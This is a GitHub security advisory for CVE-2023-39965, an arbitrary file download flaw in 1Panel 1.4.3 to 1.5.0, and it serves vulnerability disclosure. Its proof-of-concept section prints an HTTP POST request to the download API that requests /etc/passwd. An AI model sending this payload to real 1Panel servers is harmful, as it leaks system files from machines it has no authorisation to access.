# [M] 1Panel Arbitrary File Download vulnerability

## Summary
Severity: Medium
Advisory: GHSA-85cf-gj29-f555
CVE: CVE-2023-39965
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:L (CVSS_V3)
Published: 2023-08-10
Source: https://github.com/advisories/GHSA-85cf-gj29-f555
Type: github-advisory

## Affected
- Go: `github.com/1Panel-dev/1Panel` — affected >=1.4.3 <1.5.0

## Details
### Summary
Any file downloading vulnerability exists in 1Panel backend.

### Details
Authenticated attackers can download arbitrary files through the API interface. This code has unauthorized access.
![image](https://user-images.githubusercontent.com/116613486/257246024-d0e35800-5fd8-4907-8b1b-504afaad859e.png)

### PoC
payload:

POST /api/v1/files/download/bypath HTTP/1.1
Host: ip
Content-Type: application/json

{"path":"/etc/passwd"}

![f77959349e96543436eea18283fa75c](https://user-images.githubusercontent.com/116613486/257245459-13f2f31b-fcfe-4a27-ba52-e2f1e5d4d749.png)


### Impact
Attackers can freely download the file content on the target system. This will be caused a large amount of information leakage.

## References
- https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-85cf-gj29-f555
- https://nvd.nist.gov/vuln/detail/CVE-2023-39965
- https://github.com/1Panel-dev/1Panel
- https://github.com/1Panel-dev/1Panel/releases/tag/v1.5.0
